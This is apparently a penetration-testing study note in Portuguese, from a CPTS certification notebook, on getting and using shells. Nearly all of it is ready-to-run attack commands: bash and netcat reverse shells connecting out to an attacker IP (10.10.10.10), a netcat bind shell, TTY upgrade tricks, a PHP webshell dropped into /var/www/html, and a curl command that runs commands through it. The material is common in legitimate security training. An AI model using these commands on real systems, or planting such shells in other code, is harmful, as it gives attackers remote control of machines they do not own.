> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/getting-started/using-shells.md).

# Using Shells

* Inicie um `nc`ouvinte em uma porta local

```sh
nc -lvnp 1234
```

* Enviar um shell reverso do servidor remoto

```sh
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

* Outro comando para enviar um shell reverso do servidor remoto

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

* Inicie um bind shell no servidor remoto

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

* Conecte-se a um shell de ligação iniciado no servidor remoto

```sh
nc 10.10.10.1 1234
```

* Atualizar shell TTY (1)

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Atualizar shell TTY (2)**

* As informações necessárias são o tipo TERM ( *“xterm-256color”* ) e o tamanho do TTY atual ( *“rows 38; columns 116”* )

{% code lineNumbers="true" %}

```sh
ctrl+z
# echo $TERM 
# stty -a 
stty raw -echo  
fg 
enter twice
# Configurar o tipo de shell, o tipo de terminal e o tamanho do stty
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

{% endcode %}

* Crie um arquivo php webshell

```sh
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
```

* Executar um comando em um webshell carregado

```sh
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
